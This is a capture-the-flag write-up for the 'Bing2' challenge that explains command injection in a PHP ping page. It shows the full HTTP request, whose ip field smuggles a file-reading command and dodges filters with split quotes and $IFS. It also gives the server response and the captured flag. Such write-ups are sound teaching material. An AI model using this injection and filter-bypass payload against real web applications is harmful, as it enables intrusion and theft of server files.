# Bing2

This challenge seems to be a command injection challenge. The given code shows that the PHP code (file `bing.php`) uses the function `shell_exec` that is vulnerable to command injection. 

But the PHP code also has a lot of filters, so you can not inject anything. E.g. whitespace and the words `cat` and `flag` cannot be used directly. 

``` http
POST /bing.php HTTP/2
Host: 7f97d79d0808e3ff896df13b.deadsec.quest
Content-Type: application/x-www-form-urlencoded
Content-Length: 52

Submit=1&ip=127.0.0.1;ca''t$IFS$9/fl''ag.txt
```

Make sure there is not more than one line between `Content-Length` row and the POST parameters. 

``` http
HTTP/2 200 OK
Date: Sat, 27 Jul 2024 10:29:27 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 468
Vary: Accept-Encoding
Strict-Transport-Security: max-age=31536000; includeSubDomains

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.181 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.109 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.096 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.124 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3003ms
rtt min/avg/max/mdev = 0.096/0.127/0.181/0.032 ms
DEAD{5b814948-3153-4dd5-a3ac-bc1ec706d766}
```

The flag is

```
DEAD{5b814948-3153-4dd5-a3ac-bc1ec706d766}
```
